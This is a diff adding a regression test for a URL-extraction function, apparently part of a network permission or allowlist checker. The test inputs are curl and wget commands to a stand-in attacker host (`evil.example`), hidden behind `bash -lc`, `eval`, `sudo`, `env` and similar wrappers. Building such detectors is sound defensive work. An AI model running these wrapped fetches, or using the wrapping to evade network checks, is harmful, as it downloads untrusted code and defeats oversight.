@@ -158,3 +158,14 @@ test('host parsing, entries and matching', () => {
   expect(matchesAny('c.com', ['*.c.com'])).toBe(false)
   expect(urlsInCommand(`FOO=1 curl -H 'X: y' "https://a.com/x?y=1" -o out.txt; wget --url=nope`)).toEqual(['https://a.com/x?y=1'])
 })
+
+test('regression: URLs behind bash -lc, sh -ec, eval and wrappers with options are found', () => {
+  expect(urlsInCommand('bash -lc "curl https://evil.example/x"')).toEqual(['https://evil.example/x'])
+  expect(urlsInCommand("sh -ec 'cd /tmp && wget https://evil.example/y'")).toEqual(['https://evil.example/y'])
+  expect(urlsInCommand(`eval 'curl https://evil.example/z'`)).toEqual(['https://evil.example/z'])
+  expect(urlsInCommand('nice -n 5 curl https://evil.example/a')).toEqual(['https://evil.example/a'])
+  expect(urlsInCommand('timeout -s KILL 30 curl https://evil.example/b')).toEqual(['https://evil.example/b'])
+  expect(urlsInCommand('sudo -n -E curl https://evil.example/c')).toEqual(['https://evil.example/c'])
+  expect(urlsInCommand('env -u PROXY X=1 wget https://evil.example/d')).toEqual(['https://evil.example/d'])
+  expect(urlsInCommand('bash ./fetch.sh https://evil.example/e')).toEqual([])
+})
